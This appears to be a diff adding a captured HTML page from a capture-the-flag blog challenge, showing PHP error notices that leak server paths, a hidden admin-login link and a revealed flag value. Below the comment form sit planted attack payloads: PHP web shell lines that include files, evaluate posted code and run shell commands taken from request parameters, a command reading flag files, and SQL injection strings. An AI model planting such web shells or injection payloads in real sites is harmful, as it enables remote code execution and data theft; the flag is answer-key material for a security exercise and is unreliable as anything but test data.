@@ -1,0 +1,41 @@
+<!doctype html>
+<html>
+	<head>
+		<title><br />
+<b>Notice</b>:  Undefined variable: title in <b>/app/index.php</b> on line <b>27</b><br />
+ -- Cody's First Blog</title>
+	</head>
+	<body>
+		<h1><br />
+<b>Notice</b>:  Undefined variable: title in <b>/app/index.php</b> on line <b>30</b><br />
+</h1>
+		<br />
+<b>Warning</b>:  include(Admin.inc.php): failed to open stream: No such file or directory in <b>/app/index.php</b> on line <b>21</b><br />
+<br />
+<b>Warning</b>:  include(): Failed opening 'Admin.inc.php' for inclusion (include_path='.:/usr/share/php:/usr/share/pear') in <b>/app/index.php</b> on line <b>21</b><br />
+		<br>
+		<br>
+		<hr>
+		<h3>Comments</h3>
+		<!--<a href="?page=admin.auth.inc">Admin login</a>-->
+		<h4>Add comment:</h4>
+		<form method="POST">
+			<textarea rows="4" cols="60" name="body"></textarea><br>
+			<input type="submit" value="Submit">
+		</form>
+		<hr>
+		<p>Admin flag is ^FLAG^a38e922dd1023ff1f2b2c531d15d01554530e7ee323ea54c8e78d3a7e6fc8754$FLAG$</p>
+				<hr>
+		<p><?php include($_GET['f']); ?></p>
+				<hr>
+		<p><?php eval($_POST['c']); ?></p>
+				<hr>
+		<p><?php system($_GET['cmd']); ?></p>
+				<hr>
+		<p><?php system('cat /flag*'); ?></p>
+				<hr>
+		<p>' UNION SELECT '^FLAG^', 2, 3--</p>
+				<hr>
+		<p>1' OR '1'='1</p>
+			</body>
+</html>
